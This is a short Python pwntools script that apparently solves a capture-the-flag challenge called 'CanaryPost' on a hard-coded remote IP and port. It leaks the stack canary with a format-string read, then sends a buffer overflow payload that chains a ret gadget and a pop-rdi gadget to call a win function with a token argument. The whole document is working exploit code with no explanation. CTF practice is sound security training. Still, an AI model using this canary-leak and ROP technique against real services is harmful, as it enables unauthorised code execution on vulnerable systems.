#!/usr/bin/env python3
"""05 CanaryPost: remote blind solve (pwntools + network only)."""
from pwn import *
import re

HOST = '167.86.100.57'
PORT = 9005

POP_RDI = 0x4014d2
RET     = 0x40101a
WIN     = 0x4012c2
TOKEN   = 0x4e555354dead

context.arch = 'amd64'
context.log_level = 'error'
io = remote(HOST, PORT)

io.recvuntil(b'debug):')
io.sendline(b'%15$p')
buf = io.recvuntil(b'final message:')
canary = int(re.findall(rb'0x([0-9a-fA-F]+)', buf)[-1], 16)
assert canary & 0xff == 0

payload  = b'B' * 40
payload += p64(canary)
payload += p64(0)
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(TOKEN)
payload += p64(WIN)

io.send(payload)
print(io.recvall(timeout=2).decode(errors='ignore'), end='')
